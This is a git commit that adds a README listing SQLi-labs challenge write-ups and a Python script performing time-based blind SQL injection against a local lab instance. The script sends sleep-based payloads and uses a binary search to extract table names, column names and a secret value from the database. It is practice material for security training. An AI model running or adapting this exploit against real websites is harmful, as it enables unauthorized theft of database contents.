b7cacb76fa2a740cfeb9c323eb5cec1a4f8052ac
Rohit Narayanan M <rohitnanu.m@gmail.com>
2021-12-07 11:37:03 +0530

    Organized

---
+++ README.md
@@ -0,0 +1,41 @@
+# SQLi-labs
+
+## Writeups 
+
+- [Challenge 1](writeups/Challenge-1.md)
+- [Challenge 2](writeups/Challenge-2.md)
+- [Challenge 3](writeups/Challenge-3.md)
+- [Challenge 4](writeups/Challenge-4.md)
+- [Challenge 5](writeups/Challenge-5.md)
+- [Challenge 6](writeups/Challenge-6.md)
+- [Challenge 7](writeups/Challenge-7.md)
+- [Challenge 8](writeups/Challenge-8.md)
+- [Lesson 11](writeups/Lesson-11.md)
+- [Lesson 12](writeups/Lesson-12.md)
+- [Lesson 13](writeups/Lesson-13.md)
+- [Lesson 14](writeups/Lesson-14.md)
+- [Lesson 15](writeups/Lesson-15.md)
+- [Lesson 16](writeups/Lesson-16.md)
+- [Lesson 17](writeups/Lesson-17.md)
+- [Lesson 18](writeups/Lesson-18.md)
+- [Lesson 19](writeups/Lesson-19.md)
+- [Lesson 20](writeups/Lesson-20.md)
+- [Lesson 21](writeups/Lesson-21.md)
+- [Lesson 22](writeups/Lesson-22.md)
+- [Lesson 23](writeups/Lesson-23.md)
+- [Lesson 24](writeups/Lesson-24.md)
+- [Lesson 25](writeups/Lesson-25.md)
+- [Lesson 25a](writeups/Lesson-25a.py)
+- [Lesson 26](writeups/Lesson-26.py)
+- [Lesson 26a](writeups/Lesson-26a.py)
+- [Lesson 27](writeups/Lesson-27.py)
+- [Lesson 27a](writeups/Lesson-27a.py)
+- [Lesson 28](writeups/Lesson-28.py)
+- [Lesson 28a](writeups/Lesson-28a.py)
+- [Lesson 33](writeups/Lesson-33.py)
+- [Lesson 34](writeups/Lesson-34.py)
+
+## Scripts
+
+- [Boolean based](scripts/Sqli_boolean_based.py)
+- [Time based](scripts/Sqli_time_based.py)
---
+++ scripts/Sqli_time_based.py
@@ -0,0 +1,62 @@
+import requests
+
+get_table = "(select table_name from information_schema.tables where table_schema= database() limit 0,1)"
+get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit 3,1)"
+get_secret = "(select {0} from {1} )"
+base_url = "http://localhost:1234/Less-62/?id=1"
+session = requests.Session()
+number_of_request = 0
+
+
+def getsize(find):
+    global number_of_request
+    leng = 0
+    payload = base_url + "' and if((length({0})={1}),sleep(3),null) --+"
+    for i in range(1, 100):
+        url = payload.format(find, i)
+        response = requests.get(url)
+        number_of_request += 1
+        time = response.elapsed.total_seconds()
+        if (time > 3):
+            leng = i
+            print("Length :", leng)
+            break
+    return leng
+
+
+def getname(leng, find):
+    global number_of_request
+    payload = base_url + "' and if((ord(substr({0},{1},1))>={2}),sleep(3),null) --+"
+    name = ""
+    for i in range(1, leng):
+        mini = 48
+        maxi = 128
+        while(maxi > mini):
+            mid = int((maxi+mini)/2)
+            url = payload.format(find, i, mid)
+            response = requests.get(url)
+            number_of_request += 1
+            time = response.elapsed.total_seconds()
+            if (time > 3):
+                if(maxi-mini > 1):
+                    mini = mid
+                else:
+                    maxi = mini
+            else:
+                maxi = mid
+        name += chr(mid)
+    print("Number : ", number_of_request)
+    return name
+
+
+length = getsize(get_table)+1
+table_name = getname(length, get_table)
+print("Tablename : ", table_name)
+
+length = getsize(get_column.format(table_name))+1
+column_name = getname(length, get_column.format(table_name))
+print("Column Name : ", column_name)
+
+length = getsize(get_secret.format(column_name, table_name))+1
+secret_key = getname(length, get_secret.format(column_name, table_name))
+print("Secret Key : ", secret_key)
